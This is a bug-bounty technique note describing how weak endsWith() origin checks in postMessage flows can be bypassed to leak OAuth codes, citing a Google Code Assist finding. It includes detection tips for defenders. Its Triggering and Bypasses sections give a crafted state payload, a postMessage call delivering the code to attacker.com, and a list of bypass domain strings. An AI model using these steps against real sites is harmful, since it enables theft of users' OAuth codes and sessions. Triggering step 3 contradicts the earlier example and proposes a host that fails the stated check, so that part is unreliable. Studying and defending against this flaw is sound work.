---
title: postMessage targetOrigin endsWith() Bypass
slug: endswith-target-origin-bypass
created_utc: 2026-05-14T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/postmessage, technique/origin-validation, technique/oauth]
inbound: []
---

# postMessage targetOrigin endsWith() Bypass

## Pattern

A common postMessage receiver validates the source origin as:

```js
if (event.origin.endsWith('victim.com')) { /* trust */ }
```

This is bypassed with `attacker.com.victim.com` (a subdomain the attacker
controls, if subdomain takeover is in play) - but more importantly, when
the same string check is applied to **build** an outbound message's
`targetOrigin` (using an `origin` value from a controllable source like a
URL parameter, JSON state field, or referrer), the attacker hosts
`https://attacker.com/code-assist.google.com` and the `.endsWith` check
passes.

The pattern is most exploitable when a flow:
1. Reads an `origin` (or "redirect_uri", "return_url") value from a
   controllable source.
2. Uses that origin in `targetWindow.postMessage(payload, origin)`.
3. The payload contains a secret (OAuth code, session token, CSRF token).

Jacob Domeraki's Google Code Assist finding: the redirect URI page took
`state` (JSON-encoded), pulled the `origin` key, and used it directly in
a `postMessage` targetOrigin. Path attacker.com/code-assist.google.com
satisfied the check; OAuth code was leaked to attacker.com. Paid $20K.

## Preconditions

- A page reads an "origin" value from any user-influenced source: URL
  query, JSON-encoded state, postMessage payload, referrer.
- That value is used as `targetOrigin` for a `postMessage` carrying
  sensitive data.
- Origin validation uses string-prefix/suffix matching, not strict
  equality against a whitelist.

## Detection

- `js_analyzer`: tag every `window.postMessage(*, x)` where `x` is not a
  string literal. For each, trace the source of `x`.
- Grep the rendered page source for `endsWith`, `startsWith`,
  `includes`, `indexOf` applied to `event.origin` or to a URL-parsed
  hostname.
- For OAuth flows: capture the `state` parameter, inspect for nested JSON
  with an `origin`/`redirect`/`callback` field.

## Triggering

For the OAuth-leak variant (Jacob Domeraki style):

1. Initiate OAuth on the target's redirect-URI page with a controlled
   `state` value:
   ```
   state = base64({ origin: "https://attacker.com/victim.com", ... })
   ```
2. Complete the OAuth round-trip; the redirect-URI page calls
   `postMessage(code, 'https://attacker.com/victim.com')`.
3. Attacker page listens on `https://attacker.com/victim.com` for the
   message - but Chrome strips the path; **so the trick is to use
   a host that satisfies `endsWith` while being attacker-controlled**.
   In Chrome's check, the receiver matches a hostname only - so a
   subdomain `victim-com.attacker.com` works iff the check is on a path
   string, not the hostname. Re-read the actual `endsWith` argument to
   pick the working variant.

## Bypasses

- Pure-string `endsWith('.victim.com')` -> `evil.victim.com` (subdomain
  takeover) or `xvictim.com` (no dot anchor).
- `endsWith('victim.com')` -> `attackervictim.com`,
  `attacker.com/victim.com` if comparison is against a URL string
  (path-allowed).
- `includes('victim.com')` -> any path or fragment containing the string.

## Seen in the wild

- {date: 2025-08-28, source: CT Ep 137} - Jacob Domeraki: Google Code Assist redirect-URI page used `origin` from JSON state in `postMessage` targetOrigin with client-side `endsWith` check; bypass leaked OAuth code. Paid $20K.

## References

- Critical Thinking Podcast Ep 137 - <https://www.youtube.com/watch?v=sTG-OX5BbBc>
- Related: [[async-origin-swap-race]], [[redirect-uri-bypass]]
- [postMessage SUMMARY](SUMMARY.md)
